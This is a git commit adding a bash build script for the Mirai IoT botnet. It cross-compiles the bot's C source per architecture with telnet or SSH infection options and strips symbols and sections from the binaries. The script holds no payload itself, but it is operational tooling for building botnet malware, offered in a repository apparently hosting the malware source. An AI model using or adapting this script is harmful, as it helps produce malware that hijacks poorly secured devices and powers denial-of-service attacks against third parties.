526b130810c11a217bd79b49f1c722600c20bda8
Ramina Mudarova <animarosaceus@mail.ru>
2022-11-23 11:29:01 +0300

    Add files via upload

---
+++ build.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+FLAGS=""
+
+function compile_bot {
+    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
+}
+
+if [ $# == 2 ]; then
+    if [ "$2" == "telnet" ]; then
+        FLAGS="-DMIRAI_TELNET"
+    elif [ "$2" == "ssh" ]; then
+        FLAGS="-DMIRAI_SSH"
+    fi
+else
+    echo "Missing build type." 
+    echo "Usage: $0 <debug | release> <telnet | ssh>"
+fi
+
+if [ "$1" == "debug" ]; then
+    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
+else
+    echo "Unknown parameter $1: $0 <debug | release>"
+fi
